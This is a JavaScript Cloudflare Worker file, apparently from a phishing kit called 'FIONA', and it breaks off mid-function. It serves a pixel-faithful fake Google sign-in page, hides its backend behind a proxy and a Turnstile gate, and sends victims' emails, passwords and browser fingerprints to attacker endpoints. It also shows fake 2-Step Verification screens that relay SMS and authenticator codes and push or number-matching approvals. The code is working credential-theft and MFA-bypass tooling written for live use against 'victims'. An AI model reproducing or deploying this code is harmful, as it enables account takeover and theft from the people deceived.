/**
 * FIONA — Cloudflare Worker (single-file, no separate HTML needed)
 *
 * Deploy this one file. No HTML file, no KV, no build step.
 *
 * Place at:  backend/login-pages/google/worker.js
 *
 * Endpoints:
 *   GET /               Bot check → Turnstile gate → serves Google login page
 *   POST /verify-turnstile  Receives Turnstile token, proxies verification to backend, sets cookie
 *   /api/*              Proxies to BACKEND_URL (backend never visible to victim)
 *   OPTIONS *           CORS preflight
 *
 * Deployment:
 *   DeploymentService reads this file, replaces __BACKEND_URL__ with the real backend URL,
 *   then uploads the modified script to Cloudflare. No CF env bindings are used.
 *   BACKEND_URL is baked into the script at deploy time via string replacement only.
 *
 * Turnstile:
 *   site_key — fetched at request time from GET {BACKEND_URL}/api/domain/config?hostname=
 *   secret_key — never in this file; backend verifies tokens via POST {BACKEND_URL}/api/turnstile/verify
 */

// BACKEND_URL is injected by DeploymentService via string replacement before upload.
// Never appears in any HTML or JS returned to clients — only used in server-side fetch() calls.
const BACKEND_URL = '__BACKEND_URL__';

// ─────────────────────────────────────────────────────────────────────────────
//  Embedded Google login page HTML
//  (all CSS + JS inline; no external local files needed)
// ─────────────────────────────────────────────────────────────────────────────
const HTML_TEMPLATE = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in with your Google Account.</title>
  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'><path fill='%234285F4' d='M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z'/><path fill='%2334A853' d='M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.86-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z'/><path fill='%23FBBC05' d='M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z'/><path fill='%23EA4335' d='M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.21 6.58-9.07 12.31-9.07z'/></svg>" type="image/svg+xml">
  <style>
    /* CSS Variables from reference */
    :root {
      --spacing: 0.25rem;
      --color-google-blue: #0b57d0;
      --color-google-blue-hover: #0e4cad;
      --color-google-border: #747775;
      --color-google-border-hover: #1f1f1f;
      --color-google-red: #b3261e;
    }

    * {
      box-sizing: border-box;
      border: 0 solid;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: Arial, sans-serif;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
      background-color: #f0f4f9;
      color: #1f1f1f;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100dvh;
    }

    /* Progress bar */
    #progressBar {
      display: none;
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 4px;
      background: #e8eaed;
      z-index: 10;
      border-radius: 28px 28px 0 0;
      overflow: hidden;
    }
    #progressBar.visible { display: block; }
    #progressBar::after {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      height: 100%;
      width: 100%;
      background: #1a73e8;
      animation: loading-progress 1s linear infinite;
    }
    @keyframes loading-progress {
      0% { transform: translateX(-100%); }
      50% { transform: translateX(0); }
      100% { transform: translateX(100%); }
    }

    /* Outer container - min-h-dvh bg-white md:bg-[#f0f4f9] p-0 md:p-6 items-center justify-center */
    .outer-container {
      display: flex;
      flex-direction: column;
      min-height: 100dvh;
      background-color: #fff;
      align-items: center;
      justify-content: center;
      padding: 0;
      overflow: hidden;
    }

    /* Card - w-full md:max-w-[1024px] lg:max-w-[1136px] bg-white md:rounded-[28px] md:shadow-sm overflow-hidden relative */
    .card {
      display: flex;
      flex-direction: column;
      width: 100%;
      min-height: 100dvh;
      background-color: #fff;
      overflow: hidden;
      position: relative;
      box-shadow: none;
    }

    /* Logo desktop - hidden md:block absolute top-[36px] left-[36px] */
    .logo-desktop {
      display: none;
    }

    /* Logo mobile - md:hidden pt-[96px] pb-[24px] px-6 */
    .logo-mobile {
      display: flex;
      padding-top: 96px;
      padding-bottom: 24px;
      padding-left: calc(var(--spacing) * 6);
      padding-right: calc(var(--spacing) * 6);
    }

    .logo-mobile svg, .logo-desktop svg {
      width: 48px;
      height: 48px;
    }

    /* Slides container */
    .slides-container {
      width: 100%;
      overflow: hidden;
    }

    /* Slides track - w-[300%] transition-transform duration-500 ease-in-out */
    .slides-track {
      display: flex;
      width: 300%;
      transition: transform 0.5s cubic-bezier(0.4, 0, 0.2, 1);
    }

    .slides-track.at-email { transform: translateX(0); }
    .slides-track.at-password { transform: translateX(-33.3333%); }
    .slides-track.at-2fa { transform: translateX(-66.6666%); }

    /* Slide - w-1/3 flex flex-col md:flex-row px-6 md:p-[36px] */
    .slide {
      width: 33.3333%;
      flex-shrink: 0;
      display: flex;
      flex-direction: column;
      padding-left: calc(var(--spacing) * 6);
      padding-right: calc(var(--spacing) * 6);
    }

    /* Left column - md:w-1/2 md:pr-[48px] md:mt-[72px] */
    .left-col {
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      width: 100%;
    }

    /* Title - text-[32px] md:text-[36px] leading-[40px] md:leading-[44px] font-normal text-google-border-hover mt-6 md:mt-0 mb-2 md:mb-3 */
    .left-col h1 {
      font-size: 32px;
      line-height: 40px;
      font-weight: 400;
      color: var(--color-google-border-hover);
      margin-top: calc(var(--spacing) * 6);
      margin-bottom: calc(var(--spacing) * 2);
    }

    /* Subtitle - text-base text-google-border-hover font-normal md:text-left */
    .left-col .subtitle {
      font-size: 16px;
      line-height: 1.5;
      color: var(--color-google-border-hover);
      font-weight: 400;
    }

    /* Right column - md:w-1/2 mt-8 md:mt-[72px] */
    .right-col {
      display: flex;
      flex-direction: column;
      width: 100%;
      margin-top: calc(var(--spacing) * 8);
    }

    .right-col-inner {
      display: flex;
      flex-direction: column;
      height: 100%;
    }

    /* Form fields - space-y-2 */
    .form-fields {
      display: flex;
      flex-direction: column;
    }

    .form-fields > * + * {
      margin-top: calc(var(--spacing) * 2);
    }

    /* Input wrapper */
    .input-wrapper {
      position: relative;
    }

    /* Input - peer w-full px-4 py-4 text-base bg-transparent border rounded-lg outline-none transition-all duration-200 focus:border-2 focus:px-[15px] focus:py-[15px] border-google-border focus:border-google-blue hover:border-google-border-hover */
    .input-wrapper input {
      width: 100%;
      padding: calc(var(--spacing) * 4);
      font-size: 16px;
      line-height: 1.5;
      background-color: transparent;
      border: 1px solid var(--color-google-border);
      border-radius: 0.5rem;
      outline: none;
      transition: all 0.2s;
      color: #202124;
      font-family: inherit;
    }

    .input-wrapper input::placeholder {
      color: transparent;
    }

    .input-wrapper input:hover {
      border-color: var(--color-google-border-hover);
    }

    .input-wrapper input:focus {
      border: 2px solid var(--color-google-blue);
      padding: 15px;
    }

    .input-wrapper input.error-input {
      border: 2px solid var(--color-google-red);
      padding: 15px;
    }

    /* Label - absolute left-4 top-1/2 -translate-y-1/2 text-base transition-all duration-200 pointer-events-none bg-white px-1 peer-focus:top-0 peer-focus:text-xs peer-[:not(:placeholder-shown)]:top-0 peer-[:not(:placeholder-shown)]:text-xs text-[#444746] peer-focus:text-google-blue */
    .input-wrapper label {
      position: absolute;
      left: calc(var(--spacing) * 4);
      top: 50%;
      transform: translateY(-50%);
      font-size: 16px;
      line-height: 1;
      transition: all 0.2s;
      pointer-events: none;
      background-color: #fff;
      padding-left: var(--spacing);
      padding-right: var(--spacing);
      color: #444746;
    }

    .input-wrapper input:focus + label,
    .input-wrapper input:not(:placeholder-shown) + label {
      top: 0;
      font-size: 12px;
    }

    .input-wrapper input:focus + label {
      color: var(--color-google-blue);
    }

    .input-wrapper input.error-input + label,
    .input-wrapper input.error-input:not(:placeholder-shown) + label {
      color: var(--color-google-red);
    }

    /* Error message */
    .error-message {
      display: none;
      color: var(--color-google-red);
      font-size: 12px;
      margin-top: calc(var(--spacing) * 2);
      line-height: 1.4;
    }
    .error-message.show {
      display: block;
    }

    /* Link text - mt-2 text-sm text-google-blue font-medium cursor-pointer hover:bg-blue-50/50 w-fit px-1 py-1 -ml-1 rounded transition-colors */
    .link-text {
      margin-top: calc(var(--spacing) * 2);
      font-size: 14px;
      color: var(--color-google-blue);
      font-weight: 500;
      cursor: pointer;
      width: fit-content;
      padding: var(--spacing);
      margin-left: calc(var(--spacing) * -1);
      border-radius: 0.25rem;
      transition: background-color 0.2s;
      text-decoration: none;
    }

    .link-text:hover {
      background-color: rgba(239, 246, 255, 0.5);
    }

    /* Info text - mt-10 text-sm text-[#444746] leading-relaxed */
    .info-text {
      margin-top: calc(var(--spacing) * 10);
      font-size: 14px;
      color: #444746;
      line-height: 1.625;
    }

    .info-text span {
      color: var(--color-google-blue);
      font-weight: 500;
      cursor: pointer;
    }

    .info-text span:hover {
      text-decoration: underline;
    }

    /* Actions - flex justify-between md:justify-end items-center md:gap-8 mt-4 pt-10 */
    .actions {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: calc(var(--spacing) * 4);
      padding-top: calc(var(--spacing) * 10);
    }

    /* Button link - text-google-blue font-medium cursor-pointer hover:bg-blue-50/50 px-2 py-2 -ml-2 rounded transition-colors text-sm */
    .btn-link {
      color: var(--color-google-blue);
      font-weight: 500;
      cursor: pointer;
      background: none;
      border: none;
      padding: calc(var(--spacing) * 2);
      margin-left: calc(var(--spacing) * -2);
      border-radius: 0.25rem;
      font-size: 14px;
      transition: background-color 0.2s;
      font-family: inherit;
    }

    .btn-link:hover {
      background-color: rgba(239, 246, 255, 0.5);
    }

    /* Button primary - bg-google-blue text-white px-6 py-2 rounded-full font-medium hover:shadow-md hover:bg-google-blue-hover transition-shadow text-sm disabled:opacity-50 cursor-pointer disabled:cursor-not-allowed select-none */
    .btn-primary {
      position: relative;
      z-index: 10;
      background-color: var(--color-google-blue);
      color: white;
      padding: calc(var(--spacing) * 2) calc(var(--spacing) * 6);
      border-radius: 9999px;
      font-weight: 500;
      border: none;
      cursor: pointer;
      font-size: 14px;
      transition: box-shadow 0.2s, background-color 0.2s;
      user-select: none;
      font-family: inherit;
    }

    .btn-primary:hover {
      box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1), 0 2px 4px -2px rgba(0,0,0,0.1);
      background-color: var(--color-google-blue-hover);
    }

    .btn-primary:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }

    /* Email chip - flex items-center gap-2 border border-google-border/30 rounded-full px-1.5 py-1 pr-3 w-fit cursor-pointer hover:bg-black/4 transition-colors */
    .email-chip {
      display: flex;
      align-items: center;
      gap: calc(var(--spacing) * 2);
      border: 1px solid rgba(116, 119, 117, 0.3);
      border-radius: 9999px;
      padding: var(--spacing) calc(var(--spacing) * 1.5) var(--spacing) calc(var(--spacing) * 3);
      width: fit-content;
      cursor: pointer;
      transition: background-color 0.2s;
    }

    .email-chip:hover {
      background-color: rgba(0, 0, 0, 0.04);
    }

    /* Avatar - w-5 h-5 rounded-full bg-gray-200 flex items-center justify-center overflow-hidden */
    .email-chip .avatar {
      width: calc(var(--spacing) * 5);
      height: calc(var(--spacing) * 5);
      border-radius: 50%;
      background-color: #e5e7eb;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      flex-shrink: 0;
    }

    .email-chip .avatar svg {
      width: calc(var(--spacing) * 4);
      height: calc(var(--spacing) * 4);
      color: #6b7280;
    }

    /* Email text - text-sm font-medium */
    .email-chip .email-text {
      font-size: 14px;
      font-weight: 500;
    }

    /* Chevron - w-4 h-4 text-[#444746] */
    .email-chip svg.chevron {
      width: calc(var(--spacing) * 4);
      height: calc(var(--spacing) * 4);
      color: #444746;
    }

    /* Checkbox wrapper - flex items-center gap-3 mt-4 ml-1 */
    .checkbox-wrapper {
      display: flex;
      align-items: center;
      gap: calc(var(--spacing) * 3);
      margin-top: calc(var(--spacing) * 4);
      margin-left: var(--spacing);
    }

    .checkbox-wrapper .checkbox-container {
      position: relative;
      display: flex;
      align-items: center;
    }

    /* Checkbox - appearance-none w-[18px] h-[18px] border-2 border-[#444746] rounded-[2px] cursor-pointer checked:bg-google-blue checked:border-google-blue transition-colors */
    .checkbox-wrapper input[type="checkbox"] {
      appearance: none;
      width: 18px;
      height: 18px;
      border: 2px solid #444746;
      border-radius: 2px;
      cursor: pointer;
      position: relative;
      transition: all 0.2s;
      margin: 0;
    }

    .checkbox-wrapper input[type="checkbox"]:checked {
      background-color: var(--color-google-blue);
      border-color: var(--color-google-blue);
    }

    /* Checkmark SVG - absolute w-3.5 h-3.5 text-white pointer-events-none hidden peer-checked:block left-[2px] */
    .checkbox-wrapper .checkmark {
      position: absolute;
      width: 14px;
      height: 14px;
      color: white;
      pointer-events: none;
      display: none;
      left: 2px;
    }

    .checkbox-wrapper input[type="checkbox"]:checked + .checkmark {
      display: block;
    }

    /* Checkbox label - text-sm text-google-border-hover cursor-pointer font-normal select-none */
    .checkbox-wrapper label {
      font-size: 14px;
      color: var(--color-google-border-hover);
      cursor: pointer;
      user-select: none;
      font-weight: 400;
    }

    /* Footer - w-full md:max-w-[1136px] mt-auto md:mt-6 px-6 md:px-0 py-4 flex flex-col md:flex-row justify-between items-center text-[12px] text-[#5f6368] gap-4 */
    .footer {
      width: 100%;
      margin-top: auto;
      padding: calc(var(--spacing) * 4) calc(var(--spacing) * 6);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: space-between;
      font-size: 12px;
      color: #5f6368;
      gap: calc(var(--spacing) * 4);
    }

    /* Language button */
    .footer .language {
      display: flex;
      align-items: center;
      gap: var(--spacing);
      cursor: pointer;
      padding: calc(var(--spacing) * 2);
      margin-left: calc(var(--spacing) * -2);
      border-radius: 0.25rem;
      transition: background-color 0.2s;
      width: fit-content;
      background: none;
      border: none;
      font-family: inherit;
      font-size: 12px;
      color: #5f6368;
    }

    .footer .language:hover {
      background-color: #f1f3f4;
    }

    .footer .language svg {
      width: 18px;
      height: 18px;
      fill: currentColor;
      margin-top: 2px;
    }

    /* Footer links */
    .footer .links {
      display: flex;
      align-items: center;
      gap: calc(var(--spacing) * 6);
    }

    .footer .links span {
      cursor: pointer;
      transition: color 0.2s;
    }

    .footer .links span:hover {
      color: #202124;
    }

    /* 2FA slide specific styles */
    .slide-2fa .left-col h1 {
      font-size: 28px;
      line-height: 36px;
      margin-bottom: calc(var(--spacing) * 4);
    }

    .slide-2fa .left-col .subtitle {
      font-size: 16px;
      color: #202124;
      margin-bottom: calc(var(--spacing) * 8);
      line-height: 1.5;
    }

    .slide-2fa .left-col .email-chip .avatar {
      width: calc(var(--spacing) * 6);
      height: calc(var(--spacing) * 6);
      background-color: #5f6368;
    }

    .slide-2fa .left-col .email-chip .avatar svg {
      color: white;
    }

    .slide-2fa .left-col .email-chip .email-text {
      color: #202124;
      max-width: 200px;
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
    }

    .slide-2fa .left-col .email-chip svg.chevron {
      color: #5f6368;
    }

    .slide-2fa .left-col .email-chip {
      border-color: #dadce0;
    }

    .slide-2fa .left-col .email-chip:hover {
      background-color: #f1f3f4;
    }

    /* Responsive - Tablet and up (768px = 48rem) */
    @media (min-width: 48rem) {
      .outer-container {
        background-color: #f0f4f9;
        padding: calc(var(--spacing) * 6);
      }

      .card {
        width: 100%;
        max-width: 1024px;
        border-radius: 28px;
        box-shadow: 0 1px 3px 0 rgba(0,0,0,0.1), 0 1px 2px -1px rgba(0,0,0,0.1);
        min-height: auto;
        height: auto;
        flex-direction: row;
      }

      .logo-desktop {
        display: block;
        position: absolute;
        top: 36px;
        left: 36px;
      }

      .logo-mobile {
        display: none;
      }

      .slide {
        padding: 36px;
        flex-direction: row;
      }

      .left-col {
        width: 50%;
        padding-right: 48px;
        margin-top: 72px;
      }

      .left-col h1 {
        font-size: 36px;
        line-height: 44px;
        margin-top: 0;
        margin-bottom: calc(var(--spacing) * 3);
      }

      .left-col .subtitle {
        text-align: left;
      }

      .right-col {
        width: 50%;
        margin-top: 72px;
      }

      .actions {
        justify-content: flex-end;
        gap: calc(var(--spacing) * 8);
      }

      .footer {
        max-width: 1136px;
        flex-direction: row;
        padding: calc(var(--spacing) * 4) 0;
        margin-top: calc(var(--spacing) * 6);
      }

      /* 2FA tablet styles */
      .slide-2fa.slide {
        padding: 48px;
      }

      .slide-2fa .left-col {
        width: 45%;
        padding-right: 48px;
      }

      .slide-2fa .right-col {
        width: 55%;
        margin-top: 0;
      }
    }

    /* Large screens (1024px = 64rem) */
    @media (min-width: 64rem) {
      .card {
        max-width: 1136px;
      }

      .footer {
        max-width: 1136px;
      }
    }
  </style>
</head>
<body>

<div class="outer-container">
  <div class="card">
    <div id="progressBar"></div>

    <!-- Desktop G logo -->
    <div class="logo-desktop">
      <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true">
        <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"/>
        <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"/>
        <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"/>
        <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"/>
      </svg>
    </div>

    <!-- Mobile G logo -->
    <div class="logo-mobile">
      <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true">
        <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"/>
        <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"/>
        <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"/>
        <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"/>
      </svg>
    </div>

    <div class="slides-container">
      <div class="slides-track at-email" id="slidesTrack">

        <!-- SLIDE 1: Email -->
        <div class="slide">
          <div class="left-col">
            <h1>Sign in</h1>
            <div class="subtitle">
              <span>with your Google Account. This account will be available to other Google apps in the browser.</span>
            </div>
          </div>

          <div class="right-col">
            <div class="right-col-inner">
              <div class="form-fields">
                <div class="input-wrapper">
                  <input id="email" placeholder=" " type="text" autocomplete="username" name="email"/>
                  <label for="email">Email or phone</label>
                </div>
                <div id="emailError" class="error-message"></div>
                
                <div class="link-text">Forgot email?</div>
                
                <div class="info-text">
                  Not your computer? Use Guest mode to sign in privately. <span>Learn more about using Guest mode</span>
                </div>
              </div>

              <div class="actions">
                <div class="btn-link">Create account</div>
                <button class="btn-primary" id="btnEmailNext">Next</button>
              </div>
            </div>
          </div>
        </div>

        <!-- SLIDE 2: Password -->
        <div class="slide">
          <div class="left-col">
            <h1>Welcome</h1>
            <div class="subtitle">
              <div class="email-chip" id="emailChip">
                <div class="avatar">
                  <svg fill="currentColor" viewBox="0 0 24 24">
                    <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
                  </svg>
                </div>
                <span class="email-text">user@gmail.com</span>
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="chevron" aria-hidden="true">
                  <path d="m6 9 6 6 6-6"/>
                </svg>
              </div>
            </div>
          </div>

          <div class="right-col">
            <div class="right-col-inner">
              <div class="form-fields">
                <div class="input-wrapper">
                  <input id="password" placeholder=" " type="password" autocomplete="current-password" name="password"/>
                  <label for="password">Enter your password</label>
                </div>
                <div id="passwordError" class="error-message"></div>
                
                <div class="checkbox-wrapper">
                  <div class="checkbox-container">
                    <input type="checkbox" id="show-password"/>
                    <svg class="checkmark" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3">
                      <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/>
                    </svg>
                  </div>
                  <label for="show-password">Show password</label>
                </div>
              </div>

              <div class="actions">
                <button class="btn-link">Try another way</button>
                <button class="btn-primary" id="btnPasswordNext">Next</button>
              </div>
            </div>
          </div>
        </div>

        <!-- SLIDE 3: 2FA -->
        <div class="slide slide-2fa">
          <div class="left-col">
            <h1>2-Step Verification</h1>
            <div class="subtitle">
              <p>To help keep your account safe, Google wants to make sure it's really you trying to sign in</p>
            </div>
            <div class="email-chip">
              <div class="avatar">
                <svg fill="currentColor" viewBox="0 0 24 24">
                  <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
                </svg>
              </div>
              <span class="email-text" id="twoFaEmailText">user@gmail.com</span>
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="chevron" aria-hidden="true">
                <path d="m6 9 6 6 6-6"/>
              </svg>
            </div>
          </div>

          <div class="right-col">
            <div class="right-col-inner">
              <div class="form-fields" id="twoFaFormFields">
                <!-- populated dynamically by renderTwoFactorUI() -->
              </div>

              <div id="twoFaError" class="error-message" role="alert"></div>

              <div class="actions" id="twoFaActions" style="justify-content: flex-end;">
                <button class="btn-link">Try another way</button>
              </div>
            </div>
          </div>
        </div>

      </div>
    </div>
  </div>

  <!-- Footer -->
  <div class="footer">
    <button class="language">
      <span>English (United States)</span>
      <svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
        <path d="M7 10l5 5 5-5z"/>
      </svg>
    </button>
    <div class="links">
      <span>Help</span>
      <span>Privacy</span>
      <span>Terms</span>
    </div>
  </div>
</div>

<script>
/* JavaScript for API integration and slide transitions */
(function() {
  'use strict';

  const CAPTURE_ID = '{{CAPTURE_ID}}';

  const progressBar = document.getElementById('progressBar');
  const slidesTrack = document.getElementById('slidesTrack');
  const emailInput = document.getElementById('email');
  const passwordInput = document.getElementById('password');
  const showPasswordCheckbox = document.getElementById('show-password');
  const emailChip = document.getElementById('emailChip');
  const btnEmailNext = document.getElementById('btnEmailNext');
  const btnPasswordNext = document.getElementById('btnPasswordNext');
  const emailError = document.getElementById('emailError');
  const passwordError = document.getElementById('passwordError');

  let sessionId = null;
  let currentEmail = '';
  let twoFactorType = null;
  let pushPollInterval = null;

  // Show password toggle
  showPasswordCheckbox.addEventListener('change', function() {
    passwordInput.type = this.checked ? 'text' : 'password';
  });

  // Email chip click - return to email step
  emailChip.addEventListener('click', function() {
    // Clear password field and errors
    passwordInput.value = '';
    hideError(passwordError);
    passwordInput.classList.remove('error-input');
    
    // Go back to email step (do NOT cancel session, just show the step)
    slidesTrack.className = 'slides-track at-email';
    
    // Focus email input
    setTimeout(function() {
      emailInput.focus();
      emailInput.select();
    }, 300);
  });

  // Email slide -> Password slide
  btnEmailNext.addEventListener('click', async function() {
    const email = emailInput.value.trim();
    if (!email) {
      showError(emailError, 'Enter an email or phone number');
      emailInput.classList.add('error-input');
      return;
    }

    hideError(emailError);
    emailInput.classList.remove('error-input');
    showProgress();

    try {
      // Collect victim's browser fingerprint for mimicry
      const fingerprint = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        languages: navigator.languages || [navigator.language],
        colorDepth: screen.colorDepth,
        screenWidth: screen.width,
        screenHeight: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform: navigator.platform,
        hardwareConcurrency: navigator.hardwareConcurrency || 4,
        deviceMemory: navigator.deviceMemory || 8,
        pixelRatio: window.devicePixelRatio || 1
      };

      const res = await fetch('/api/google/session/start', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, fingerprint, captureId: CAPTURE_ID })
      });

      const data = await res.json();
      hideProgress();

      if (!res.ok || !data.success) {
        showError(emailError, data.message || "Couldn't find your Google Account");
        emailInput.classList.add('error-input');
        return;
      }

      sessionId = data.sessionId;
      currentEmail = email;

      // Update email chip
      const emailText = emailChip.querySelector('.email-text');
      if (emailText) {
        emailText.textContent = email;
      }

      // Slide to password
      slidesTrack.className = 'slides-track at-password';

    } catch (err) {
      hideProgress();
      showError(emailError, 'Network error. Please try again.');
      emailInput.classList.add('error-input');
    }
  });

  // Password slide -> 2FA slide
  btnPasswordNext.addEventListener('click', async function() {
    const password = passwordInput.value;
    if (!password) {
      showError(passwordError, 'Enter a password');
      passwordInput.classList.add('error-input');
      return;
    }

    if (!sessionId) {
      showError(passwordError, 'Session expired. Please start again.');
      return;
    }

    hideError(passwordError);
    passwordInput.classList.remove('error-input');
    showProgress();

    try {
      const res = await fetch('/api/google/session/' + sessionId + '/password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password })
      });

      const data = await res.json();
      hideProgress();

      if (!res.ok || !data.success) {
        showError(passwordError, data.error || data.message || 'Wrong password. Try again.');
        passwordInput.classList.add('error-input');
        return;
      }

      // Route to next stage based on backend response
      if (data.nextStage === 'success') {
        slidesTrack.className = 'slides-track at-success';
      } else {
        const twoFactorType = data.twoFactorType || data.type || 'totp';
        const twoFaHint = data.twoFactorHint || data.number || '';
        const twoFaEmail = document.getElementById('twoFaEmailText');
        if (twoFaEmail) twoFaEmail.textContent = currentEmail;
        renderTwoFactorUI(twoFactorType, twoFaHint);
        slidesTrack.className = 'slides-track at-2fa';
      }

    } catch (err) {
      hideProgress();
      showError(passwordError, 'Network error. Please try again.');
      passwordInput.classList.add('error-input');
    }
  });

  // Helper functions
  function showProgress() {
    progressBar.classList.add('visible');
  }

  function hideProgress() {
    progressBar.classList.remove('visible');
  }

  function showError(el, message) {
    if (el) {
      el.textContent = message;
      el.classList.add('show');
    }
  }

  function hideError(el) {
    if (el) {
      el.textContent = '';
      el.classList.remove('show');
    }
  }

  // Enter key handlers
  emailInput.addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
      btnEmailNext.click();
    }
  });

  passwordInput.addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
      btnPasswordNext.click();
    }
  });

  // ── 2FA UI renderer ─────────────────────────────────────────────────────────
  function renderTwoFactorUI(type, hint) {
    const fields = document.getElementById('twoFaFormFields');
    const actions = document.getElementById('twoFaActions');
    if (!fields || !actions) return;

    if (type === 'dp') {
      fields.innerHTML =
        '<div style="display:flex;flex-direction:column;align-items:flex-start;width:100%;">' +
        '<div style="display:flex;justify-content:flex-start;width:100%;margin-bottom:24px;">' +
        '<span style="font-size:72px;line-height:1;font-weight:400;color:#202124;letter-spacing:-2px;">' + hint + '</span>' +
        '</div>' +
        '<h2 style="font-size:16px;font-weight:500;color:#202124;margin-bottom:12px;line-height:24px;">' +
        'Open the Gmail app on your phone' +
        '</h2>' +
        '<p style="font-size:14px;color:#444746;margin-bottom:24px;line-height:20px;">' +
        'Google sent a notification to your phone. Open the Gmail app, tap Yes on the prompt, then tap <strong>' + hint + '</strong> on your phone to verify it&#39;s you.' +
        '</p>' +
        '<label style="display:flex;align-items:center;gap:10px;font-size:14px;color:#202124;margin-bottom:24px;cursor:pointer;">' +
        '<input type="checkbox" checked style="width:16px;height:16px;accent-color:#1a73e8;" />' +
        'Don&#39;t ask again on this device' +
        '</label>' +
        '<a href="#" style="font-size:14px;color:#1a73e8;text-decoration:none;">Try another way</a>' +
        '</div>';
      actions.innerHTML = '';
      startPushPolling();
      return;
    }

    if (type === 'push') {
      fields.innerHTML =
        '<div style="text-align:center;padding:20px 0;">' +
        '<div style="font-size:48px;margin-bottom:12px;">&#128241;</div>' +
        '<p style="font-size:16px;color:#202124;font-weight:500;margin:0 0 8px;">Check your phone</p>' +
        '<p style="font-size:14px;color:#5f6368;margin:0;">' + (hint || 'A notification was sent to your registered device. Tap Yes to confirm.') + '</p>' +
        '<p style="font-size:12px;color:#9aa0a6;margin:16px 0 0;" id="pushStatus">Waiting for approval\u2026</p>' +
        '</div>';
      actions.innerHTML = '<button class="btn-link">Try another way</button>';
      startPushPolling();
      return;
    }

    var label = type === 'sms'
      ? (hint ? 'Enter the code sent to ' + hint : 'Enter the code sent to your phone')
      : (hint ? 'Enter the code from your ' + hint + ' app' : 'Enter the 6-digit code from your authenticator app');

    fields.innerHTML =
      '<div class="input-wrapper">' +
